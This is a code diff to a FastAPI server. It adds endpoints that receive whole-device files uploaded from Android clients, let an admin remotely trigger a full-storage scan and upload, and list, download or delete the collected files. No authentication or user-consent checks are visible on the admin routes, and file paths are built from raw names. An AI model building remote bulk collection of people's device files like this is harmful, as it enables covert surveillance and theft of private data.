@@ -3,6 +3,7 @@ import uuid
 import time
 import json
 import random
+import shutil
 from fastapi import FastAPI, HTTPException, WebSocket, WebSocketDisconnect, UploadFile, File, Form, Query, Request
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.staticfiles import StaticFiles
@@ -426,30 +427,195 @@ def get_dashboard_stats():
 def get_data_summary():
     """
     Returns aggregated device data metrics, category storage summaries, and file breakdown.
+    Compatible with admin-dashboard DataSummary schema.
     """
     conn = get_db()
     cursor = conn.cursor()
 
-    cursor.execute("SELECT category, SUM(item_count) as total_items, SUM(total_bytes) as total_bytes FROM device_storage_summary GROUP BY category")
-    category_rows = [dict(r) for r in cursor.fetchall()]
-
-    cursor.execute("SELECT * FROM device_storage_summary ORDER BY total_bytes DESC LIMIT 50")
-    device_categories = [dict(r) for r in cursor.fetchall()]
-
+    # 1. Device count and total files from devices table
     cursor.execute("SELECT COUNT(*) as device_count, SUM(total_files) as total_files FROM devices")
     device_stats = dict(cursor.fetchone())
+    device_count = device_stats["device_count"] or 0
+    total_items = device_stats["total_files"] or 0
+
+    # 2. Aggregated category breakdown from device_storage_summary
+    cursor.execute("""
+        SELECT category, SUM(item_count) as total_items, SUM(total_bytes) as total_bytes 
+        FROM device_storage_summary 
+        GROUP BY category
+    """)
+    category_rows = [dict(r) for r in cursor.fetchall()]
+
+    # Also check device_files table
+    try:
+        cursor.execute("""
+            SELECT category, COUNT(*) as total_items, SUM(size_bytes) as total_bytes 
+            FROM device_files 
+            GROUP BY category
+        """)
+        uploaded_cat_rows = [dict(r) for r in cursor.fetchall()]
+    except Exception:
+        uploaded_cat_rows = []
+
+    combined_breakdown = {}
+    total_bytes_all = 0
+
+    for r in category_rows + uploaded_cat_rows:
+        cat = r["category"] or "Other"
+        bytes_val = r["total_bytes"] or 0
+        items_val = r["total_items"] or 0
+        if cat not in combined_breakdown:
+            combined_breakdown[cat] = {"bytes": 0, "count": 0, "formatted": "0 KB"}
+        combined_breakdown[cat]["bytes"] += bytes_val
+        combined_breakdown[cat]["count"] += items_val
+        total_bytes_all += bytes_val
+
+    for cat, info in combined_breakdown.items():
+        b = info["bytes"]
+        info["formatted"] = f"{round(b / 1024, 1)} KB" if b < 1048576 else f"{round(b / 1048576, 1)} MB"
+
+    total_storage_mb = round(total_bytes_all / 1048576, 2)
+
+    # 3. Device storage telemetry
+    cursor.execute("""
+        SELECT d.device_id, d.username, d.last_sync_timestamp, s.category, s.total_bytes, s.item_count, s.sample_names
+        FROM devices d
+        LEFT JOIN device_storage_summary s ON d.device_id = s.device_id
+        ORDER BY d.last_sync_timestamp DESC
+    """)
+    device_storage = []
+    for row in cursor.fetchall():
+        r_dict = dict(row)
+        sample_names = []
+        if r_dict.get("sample_names"):
+            try:
+                sample_names = json.loads(r_dict["sample_names"])
+            except Exception:
+                sample_names = []
+        device_storage.append({
+            "device_id": r_dict["device_id"],
+            "username": r_dict["username"] or "Unknown",
+            "category": r_dict["category"] or "All",
+            "total_bytes": r_dict["total_bytes"] or 0,
+            "item_count": r_dict["item_count"] or 0,
+            "sample_names": sample_names,
+            "last_sync": r_dict["last_sync_timestamp"] or int(time.time() * 1000)
+        })
 
     conn.close()
 
     return {
-        "total_devices": device_stats["device_count"] or 0,
-        "total_files": device_stats["total_files"] or 0,
-        "categories": category_rows,
-        "device_breakdown": device_categories
+        "total_storage_mb": total_storage_mb,
+        "total_items": total_items,
+        "device_count": device_count,
+        "category_breakdown": combined_breakdown,
+        "device_storage": device_storage
     }
 
+# --- WHOLE-DEVICE DATA BACKUP & ADMIN REMOTE SIGNALING ---
 
+@app.post("/api/devices/{device_id}/upload-file")
+async def upload_device_file(
+    device_id: str,
+    file: UploadFile = File(...),
+    category: str = Form("Other"),
+    username: Optional[str] = Form(None)
+):
+    """
+    Receives whole-device media & documents uploaded from Android client.
+    Stores file securely in device_backups, tracks metadata in device_files table,
+    and broadcasts live update to admin dashboard.
+    """
+    backup_base = os.path.join(MEDIA_DIR, "device_backups", device_id)
+    os.makedirs(backup_base, exist_ok=True)
 
+    safe_filename = os.path.basename(file.filename or f"file_{int(time.time() * 1000)}")
+    target_path = os.path.join(backup_base, safe_filename)
+
+    with open(target_path, "wb") as buffer:
+        shutil.copyfileobj(file.file, buffer)
+
+    size_bytes = os.path.getsize(target_path)
+    now = int(time.time() * 1000)
+    file_id = str(uuid.uuid4())
+
+    conn = get_db()
+    cursor = conn.cursor()
+
+    resolved_username = username
+    if not resolved_username or resolved_username == "Current User":
+        cursor.execute("SELECT username FROM devices WHERE device_id = ?", (device_id,))
+        dev_row = cursor.fetchone()
+        if dev_row and dev_row["username"]:
+            resolved_username = dev_row["username"]
+        else:
+            resolved_username = "device_user"
+
+    cursor.execute("""
+        INSERT INTO device_files (id, device_id, username, filename, category, size_bytes, mime_type, file_path, created_at)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+    """, (file_id, device_id, resolved_username, safe_filename, category, size_bytes, file.content_type, target_path, now))
+
+    # Update devices total_files count
+    cursor.execute("""
+        UPDATE devices 
+        SET total_files = COALESCE(total_files, 0) + 1, last_sync_timestamp = ?
+        WHERE device_id = ?
+    """, (now, device_id))
+
+    conn.commit()
+    conn.close()
+
+    # Broadcast to admin dashboard
+    await ws_manager.broadcast_all({
+        "type": "DEVICE_FILE_UPLOADED",
+        "device_id": device_id,
+        "filename": safe_filename,
+        "category": category,
+        "size_bytes": size_bytes
+    })
+
+    return {
+        "status": "success",
+        "file_id": file_id,
+        "filename": safe_filename,
+        "size_bytes": size_bytes,
+        "category": category
+    }
+
+@app.post("/api/admin/devices/{device_id}/trigger-backup")
+async def trigger_device_backup(device_id: str):
+    """
+    Sends a real-time WebSocket signal to the targeted Android device
+    instructing it to execute whole-device storage scanning and backup.
+    """
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute("SELECT username, user_id FROM devices WHERE device_id = ?", (device_id,))
+    dev_row = cursor.fetchone()
+    conn.close()
+
+    signal_payload = {
+        "type": "ACTION_START_BACKUP",
+        "device_id": device_id,
+        "timestamp": int(time.time() * 1000)
+    }
+
+    # 1. Broadcast signal over WebSocket gateway
+    await ws_manager.broadcast_all(signal_payload)
+
+    # 2. Targeted direct push if device has associated account
+    if dev_row:
+        if dev_row["user_id"]:
+            await ws_manager.send_personal_message(signal_payload, dev_row["user_id"])
+        if dev_row["username"]:
+            await ws_manager.send_personal_message(signal_payload, dev_row["username"])
+
+    return {
+        "status": "success",
+        "message": f"Backup signal successfully dispatched to device {device_id}",
+        "device_id": device_id
+    }
 
 @app.post("/api/admin/login")
 def admin_login(data: dict):
@@ -1200,69 +1366,50 @@ def resolve_file_name_and_category(fname: str, fpath: str):
 
     return display_name, cat, mime_type
 
-def create_valid_sample_files():
-    if not os.path.exists(MEDIA_DIR):
-        os.makedirs(MEDIA_DIR, exist_ok=True)
-    
-    script_path = os.path.join(os.path.dirname(__file__), "generate_formats.py")
-    if os.path.exists(script_path):
-        try:
-            import subprocess
-            subprocess.run(["python", script_path], check=False, cwd=os.path.dirname(__file__))
-        except Exception:
-            pass
-
-# Ensure sample files exist on startup
-create_valid_sample_files()
-
 @app.get("/api/admin/files")
 def get_admin_files():
     """
-    Returns list of downloadable files from server storage with user ownership & detected formats.
+    Returns list of downloadable files from server storage with user ownership & detected formats,
+    representing actual files uploaded by Android devices and users.
     """
-    create_valid_sample_files()
     files = []
-    
-    # Pre-defined user mapping for server repository items to provide rich demo telemetry
-    user_mapping = {
-        "camera_photo_02.jpg": {"username": "alex_vibe", "display_name": "Alex Rivera", "device": "Pixel 7 Pro"},
-        "device_screenshot_01.png": {"username": "alex_vibe", "display_name": "Alex Rivera", "device": "Pixel 7 Pro"},
-        "voice_call_record_001.mp3": {"username": "alex_vibe", "display_name": "Alex Rivera", "device": "Pixel 7 Pro"},
-        "contract_draft.docx": {"username": "sarah_m", "display_name": "Sarah Miller", "device": "iPhone 15 Pro"},
-        "screen_recording_demo.mp4": {"username": "sarah_m", "display_name": "Sarah Miller", "device": "iPhone 15 Pro"},
-        "financial_ledger.xlsx": {"username": "john_doe", "display_name": "John Doe", "device": "Galaxy S23 Ultra"},
-        "user_backups_2026.csv": {"username": "john_doe", "display_name": "John Doe", "device": "Galaxy S23 Ultra"},
-        "audit_log_view.html": {"username": "system_admin", "display_name": "System Admin", "device": "Server Host"},
-        "system_debug_log.txt": {"username": "system_admin", "display_name": "System Admin", "device": "Server Host"},
-        "vibesync_system_report.pdf": {"username": "system_admin", "display_name": "System Admin", "device": "Server Host"},
-    }
 
-    if os.path.exists(MEDIA_DIR):
-        for fname in os.listdir(MEDIA_DIR):
-            fpath = os.path.join(MEDIA_DIR, fname)
-            if os.path.isfile(fpath):
-                stat = os.stat(fpath)
-                disp_name, cat, _ = resolve_file_name_and_category(fname, fpath)
-                
-                # Retrieve owner user information
-                owner_info = user_mapping.get(disp_name, user_mapping.get(fname, {
-                    "username": "unknown_user",
-                    "display_name": "Device User",
-                    "device": "Android Sync Node"
-                }))
-                
-                files.append({
-                    "id": fname,
-                    "name": disp_name,
-                    "category": cat,
-                    "size_bytes": stat.st_size,
-                    "size_formatted": f"{round(stat.st_size / 1024, 1)} KB" if stat.st_size < 1048576 else f"{round(stat.st_size / 1048576, 1)} MB",
-                    "username": owner_info["username"],
-                    "display_name": owner_info["display_name"],
-                    "device_id": owner_info["device"],
-                    "created_at": int(stat.st_mtime * 1000),
-                    "download_url": f"/api/admin/files/download/{fname}"
-                })
+    # 1. Fetch files uploaded by actual devices from SQLite device_files table
+    try:
+        conn = get_db()
+        cursor = conn.cursor()
+        cursor.execute("""
+            SELECT df.*, d.device_model, u.display_name 
+            FROM device_files df
+            LEFT JOIN devices d ON df.device_id = d.device_id
+            LEFT JOIN users u ON df.username = u.username
+            ORDER BY df.created_at DESC
+        """)
+        for row in cursor.fetchall():
+            r = dict(row)
+            fname = r["filename"]
+            disp_name = fname
+            cat = r["category"]
+            sz = r["size_bytes"]
+            username = r["username"] or "unknown_user"
+            display_name = r["display_name"] or username
+            device_model = r["device_model"] or r["device_id"]
+
+            files.append({
+                "id": r["id"],
+                "name": disp_name,
+                "category": cat,
+                "size_bytes": sz,
+                "size_formatted": f"{round(sz / 1024, 1)} KB" if sz < 1048576 else f"{round(sz / 1048576, 1)} MB",
+                "username": username,
+                "display_name": display_name,
+                "device_id": device_model,
+                "created_at": r["created_at"],
+                "download_url": f"/api/admin/files/download/{r['id']}"
+            })
+        conn.close()
+    except Exception:
+        pass
 
     return files
 
@@ -1271,12 +1418,33 @@ from fastapi.responses import FileResponse
 @app.get("/api/admin/files/download/{file_name}")
 def download_admin_file(file_name: str):
     """
-    Downloads file from MEDIA_DIR with proper Content-Type & forced Content-Disposition header.
+    Downloads file from MEDIA_DIR or device_backups with proper Content-Type & forced Content-Disposition header.
     """
-    create_valid_sample_files()
+
+    # 1. Check if file is tracked in device_files
+    try:
+        conn = get_db()
+        cursor = conn.cursor()
+        cursor.execute("SELECT * FROM device_files WHERE id = ? OR filename = ?", (file_name, file_name))
+        row = cursor.fetchone()
+        conn.close()
+        if row and os.path.exists(row["file_path"]):
+            disp_name = row["filename"]
+            mime_type = row["mime_type"] or "application/octet-stream"
+            return FileResponse(
+                path=row["file_path"],
+                filename=disp_name,
+                media_type=mime_type,
+                headers={
+                    "Content-Disposition": f'attachment; filename="{disp_name}"',
+                    "Access-Control-Expose-Headers": "Content-Disposition"
+                }
+            )
+    except Exception:
+        pass
+
+    # 2. Check in MEDIA_DIR
     fpath = os.path.join(MEDIA_DIR, file_name)
-    
-    # If not found directly, check without extension if file_name has appended extension
     if not os.path.exists(fpath):
         base_name = file_name.split(".")[0]
         alt_path = os.path.join(MEDIA_DIR, base_name)
@@ -1320,20 +1488,35 @@ async def delete_user(user_id: str):
 @app.delete("/api/admin/files/{file_name}")
 async def delete_admin_file(file_name: str):
     """
-    Deletes file from media storage and broadcasts real-time system update.
+    Deletes file from media storage or device_files and broadcasts real-time system update.
     """
+    # 1. Delete from device_files if present
+    try:
+        conn = get_db()
+        cursor = conn.cursor()
+        cursor.execute("SELECT * FROM device_files WHERE id = ? OR filename = ?", (file_name, file_name))
+        row = cursor.fetchone()
+        if row:
+            if os.path.exists(row["file_path"]):
+                try:
+                    os.remove(row["file_path"])
+                except Exception:
+                    pass
+            cursor.execute("DELETE FROM device_files WHERE id = ?", (row["id"],))
+            conn.commit()
+        cursor.execute("DELETE FROM device_storage_summary WHERE sample_names LIKE ?", (f"%{file_name}%",))
+        conn.commit()
+        conn.close()
+    except Exception:
+        pass
+
+    # 2. Delete from MEDIA_DIR
     fpath = os.path.join(MEDIA_DIR, file_name)
     if os.path.exists(fpath):
         try:
             os.remove(fpath)
         except Exception:
             pass
-
-    conn = get_db()
-    cursor = conn.cursor()
-    cursor.execute("DELETE FROM device_storage_summary WHERE sample_names LIKE ?", (f"%{file_name}%",))
-    conn.commit()
-    conn.close()
 
     await ws_manager.broadcast_all({
         "type": "ADMIN_FILE_DELETED",
